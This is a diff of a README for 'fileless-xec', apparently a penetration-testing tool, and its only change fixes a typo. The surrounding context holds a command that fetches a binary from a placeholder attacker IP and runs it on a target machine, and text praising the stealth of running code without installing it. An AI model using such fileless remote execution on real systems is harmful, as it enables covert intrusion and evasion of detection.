@@ -87,7 +87,7 @@ fileless-xec --http3 https://[attacker_ip]:6121/[binary_name]
 If you want to run some go code on machine where go is not installed and you don't want to install it:
 
 * For stealthiness reason (in a pentest, the less we install the better)
-* For idleness orquickness reason
+* For idleness or quickness reason
 
 You will build your go on attacker machine, and use `fileless-xec` to execute it on target machine.
 
